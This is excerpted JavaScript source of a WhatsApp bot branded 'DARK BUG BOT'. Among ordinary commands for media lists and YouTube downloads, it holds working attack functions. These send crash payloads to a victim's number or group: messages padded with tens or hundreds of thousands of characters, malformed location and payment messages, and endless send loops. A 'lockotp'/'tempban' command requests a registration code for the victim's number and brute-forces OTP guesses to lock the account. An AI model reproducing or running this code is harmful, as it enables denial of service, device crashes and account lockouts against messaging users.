...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄DARK SOUMYA 🦄DARK SOUMYA 🦄DARK SOUMYA\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
async function locationDARKy(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄DARK BUG BOT 🦄DARK BUG BOT 🦄DARK BUG BOT🦄DARK BUG BOT 🦄DARK BUG BOT 🦄DARK BUG BOT`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄DARK BUG BOT",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/bjio40.jpg" } }, { upload: GlobalTechInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄DARK BUG BOT"+" ".repeat(920000),
        'footerText': `🦄DARK BUG BOT🦄DARK BUG BOT🦄DARK BUG BOT 🦄DARK BUG BOT🦄DARK BUG BOT🦄DARK BUG BOT🦄DARK BUG BOT`,
        'description': `🦄DARK BUG BOT 🦄DARK BUG BOT 🦄DARK BUG BOT 🦄DARK BUG BOT 🦄DARK BUG BOT 🦄 DARK BUG BOT 🦄DARK BUG BOT`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
message: {
"listResponseMessage": {
title: `SOUMYA's ur father`
}}
}
async function DARKyCrashy(DARK SOUMYA,chat) {
GlobalTechInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${DARK SOUMYA}.${DARKtext1}` ,
caption: `${DARKtext1}`,
}, {quoted: join_DARK })
}
//end bug functions
...
for (let i = 0; i < DARKlod.length; i++) {
await GlobalTechInc.sendMessage(from, {text: DARKlod[i], edit: key });
}
}
        ...
        let DARKrecordin = ['recording','composing']
        let DARKrecordinfinal = DARKrecordin[Math.floor(Math.random() * DARKrecordin.length)]
        GlobalTechInc.sendPresenceUpdate(DARKrecordinfinal, from)
...
senddocu(buffer)
    ...
    case 'autostatusview':{
            ...
            case 'getcase':
                if (!isCreator) return replyglobal(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("DARKBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
...
`.trim()
                await GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            thumbnailUrl: 'https://files.catbox.moe/bjio40.jpg', 
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @DARK SOUMYA`,
                            thumbnailUrl: 'https://files.catbox.moe/bjio40.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'donasi':
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    text: 'Paypal: https://files.catbox.moe/mptp1n.jpg\n\n' + textnate
                }, {
                    quoted: m
                })
                break
...
break
            ...
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteDARK) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteDARK.length}*`
                replyglobal(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerDARK) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerDARK.length}*`
                replyglobal(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageDARK) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageDARK.length}*`
                replyglobal(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoDARK) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoDARK.length}*`
                replyglobal(teks)
            }
            break
            case 'addowner':
...
break
            case 'addvideo': {
                ...
                if (VideoDARK.includes(q)) return replyglobal("The name you entered already exists")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VideoDARK.push(q)
                await fsx.copy(delb, `./RaidenMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoDARK))
                fs.unlinkSync(delb)
            ...
            case 'delvideo': {
                ...
                if (!VideoDARK.includes(q)) return replyglobal("Name Does Not Exist in Database")
                let wanu = VideoDARK.indexOf(q)
                VideoDARK.splice(wanu, 1)
            ...
            case 'addimage': {
                ...
                if (ImageDARK.includes(q)) return replyglobal("The name you entered is already registered in the database")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                ImageDARK.push(q)
                await fsx.copy(delb, `./RaidenMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageDARK))
                fs.unlinkSync(delb)
            ...
            case 'delimage': {
                ...
                if (!ImageDARK.includes(q)) return replyglobal("The image name you entered is not registered")
                let wanu = ImageDARK.indexOf(q)
                ImageDARK.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageDARK))
            ...
            case 'addsticker': {
                ...
                if (StickerDARK.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                StickerDARK.push(q)
                await fsx.copy(delb, `./RaidenMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerDARK))
                fs.unlinkSync(delb)
            ...
            case 'delsticker': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the name of the sticker')
                if (!StickerDARK.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = StickerDARK.indexOf(q)
            ...
            case 'addvn': {
                ...
                if (VoiceNoteDARK.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteDARK.push(q)
                await fsx.copy(delb, `./RaidenMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteDARK))
                fs.unlinkSync(delb)
            ...
            case 'delvn': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Name')
                if (!VoiceNoteDARK.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = VoiceNoteDARK.indexOf(q)
                VoiceNoteDARK.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteDARK))
...
let teks = `${text}`
{
if (ZipDARK.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
ZipDARK.push(teks)
await fsx.copy(delb, `./RaidenMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipDARK))
fs.unlinkSync(delb)
...
let teks = `${text}`
{
if (!ZipDARK.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ZipDARK.indexOf(teks)
ZipDARK.splice(wanu, 1)
...
for (let x of ZipDARK) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipDARK.length}*`
...
let teks = `${text}`
{
if (ApkDARK.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./RaidenMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkDARK))
fs.unlinkSync(delb)
...
let teks = `${text}`
{
if (!ApkDARK.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ApkDARK.indexOf(teks)
ApkDARK.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkDARK))
...
for (let x of ApkDARK) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkDARK.length}`
...
let teks = `${text}`
{
if (DocDARK.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./RaidenMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocDARK))
fs.unlinkSync(delb)
...
let teks = `${text}`
{
if (!DocDARK.includes(teks)) return replyglobal("This name does not exist in the database")
...
const DARKplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await DARKplaymp3.mp3(anup3k.url)
await GlobalTechInc.sendMessage(m.chat,{
...
const DARKaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !DARKaudp3.isYTUrl(text)) return replyglobal(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await DARKaudp3.mp3(text)
await GlobalTechInc.sendMessage(m.chat,{
...
const DARKvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !DARKvidoh.isYTUrl(text)) replyglobal(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await DARKvidoh.mp4(text)
const ytc=`
...
case "DARKndroid": {
  ...
  if (cleanedNumber == "916295169569") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " DARK BUG IS IN PROCESS..");
...
case "DARKios": {
  ...
  replyglobal("please wait, " + command + " 𝐃𝐀𝐑𝐊 𝐁𝐔𝐆 𝐈𝐒 𝐎𝐍 𝐅𝐈𝐑𝐄..");
  await sleep(2000); // Adjusted sleep time for clarity
...
case "DARKios2":
  ...
  case "DARKgc":
  {
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replyglobal("*DONE✅ DARK BUG HAS BEEN FUCKING THE GROUP!.*");
...
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function DARKIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await GlobalTechInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '#BIL DARK BUG CRASH ☠️🔥',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '#FUCKED BY DARK GANG ☠️🔥',
								title: '#BIL DARK BUG CRASH ☠️🔥',
								textArgb: 0xff000000,
...
await replyglobal(`𝐃𝐀𝐑𝐊 𝐁𝐔𝐆 𝐈𝐒 𝐎𝐍 𝐅𝐈𝐑𝐄....`)
    ...
    [whatsappNumber]
				...
				case 'DARKpayment': {
					if (!isPremium) return replyglobal(mess.prem)
if (!text) return replyglobal(`Usage .${command} 916295169569`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 916295169569`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
    ...
    if (cleanedNumber == "916195169569") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function DARKBugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
				...
				await DARKBugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
				...
				break;
		case 'onekill': case 'oneclickall': case 'DARKsamsung': case 'DARKwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 923444844060`)
let DARKyvictim = q.replace(/[^0-9]/g, "")
if (DARKyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
let target = DARKyvictim + '@s.whatsapp.net'
await replyglobal(`𝐃𝐀𝐑𝐊 𝐁𝐔𝐆 𝐈𝐒 𝐎𝐍 𝐅𝐈𝐑𝐄....`)
for (let j = 0; j < 1; j++) {
await listDARKfck(target, oneclickDARK)
await locationDARKy(target, force)
await DARKkillpic(target, oneclicDARK)
await locationDARKy(target, force)
await blackening(target, force2)
await locationDARKy(target, force)
}
await replyglobal(`Successfully Send Bug to ${DARKyvictim} Using ${command}. ✅`)
}
break
...
let DARKyvictim = q.replace(/[^0-9]/g, "")
if (DARKyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
await replyglobal(`𝐃𝐀𝐑𝐊 𝐁𝐔𝐆 𝐎𝐍 𝐅𝐈𝐑𝐄....`)
let target = DARKyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
...
break
case 'DARKfreeze': case 'DARKblankscrn': {
	if (!isPremium) return replyglobal(mess.prem)
	const DARK.Doc = {
    url: "./256/x.mp3"
};
async function DARKFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await GlobalTechInc.sendMessage(jid, {
    'document': DARKDoc,
    'fileName': "🦄DARK BUG BOT" + DARKtext1,
    'mimetype': "application/zip",
    'caption': "🦄DARK BUG BOT" + DARKtext1,
...
await xeonFreeze(m.chat);
	...
	break
	case 'DARKkillgc': case 'DARKblankscrn': case 'DARKwebgc': {
		if (!isPremium) return replyglobal(mess.prem)
		const DARKimage = {
    title: "🦄DARK BUG BOT; ",
    hasMediaAttachment: true,
...
GlobalTechInc.relayMessage(m.chat, {
    'viewOnceMessage': {
		...
		break
		case 'DARKiosfreeze': case 'DARKioshot':{
			if (!isPremium) return replyglobal(mess.prem)
			const join_DARK GANG = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
...
title: `SOUMYA's ur father`
			...
			async function DARKyCrashyIos(DARK SOUMYA, chat, participant) {
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🦄DARK BUG BOT${DARKtext11}`,
      caption: `🦄DARK BUG BOT ${DARKtext11}`,
    },
    { quoted: { ...join_DARK GANG, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      DARKyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
...
case 'lockotp': case 'tempban': {
  ...
  const DARKCountryCode = args2[0];
  const DARKtarget = args2[1];
  const DARKNumber = DARKtarget.replace('@s.whatsapp.net', '');
  const DARKmerge = `${DARKCountryCode}${DARKtarget}`
  const DARKMention = DARKmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + DARKMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [DARKMention]
  );
  try {
    const { stateDARK, saveCredsDARK } = await useMultiFileAuthState('./session');
    const DARKRequest = await GlobalTechInc.requestRegistrationCode({
      phoneNumber: '+' + DARKCountryCode + `${DARKNumber}`,
      phoneNumberCountryCode: DARKCountryCode,
      phoneNumberNationalNumber: `${DARKNumber}`,
  ...
  for (let i = 0; i < 10000; i++) {
    try {
      var DARKPrefix = Math.floor(Math.random() * 999);
      var DARKSuffix = Math.floor(Math.random() * 999);
      await GlobalTechInc.register(`${DARKPrefix}-${DARKSuffix}`);
    } catch (err) {
      console.log(`${DARKPrefix}-${DARKSuffix}`);
    }
  }
}
break;
...
if (typemenu === 'v1') {
      ...
      renderLargerThumbnail: true
                    ...
                    GlobalTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./RaidenMedia/thumb.jpg'),
                        caption: DARKmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
		...
		let DARKresources = await Telesticker(args[0])
		await replyglobal(`Sending ${DARKresources.length} stickers...`)
		if (m.isGroup && DARKresources.length > 30) {
			await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < DARKresources.length; i++) {
				GlobalTechInc.sendMessage(m.sender, { sticker: { url: DARKresources[i].url }})
			}
		} else {
			for (let i = 0; i < DARKresources.length; i++) {
				GlobalTechInc.sendMessage(m.chat, { sticker: { url: DARKresources[i].url }})
			}
		}
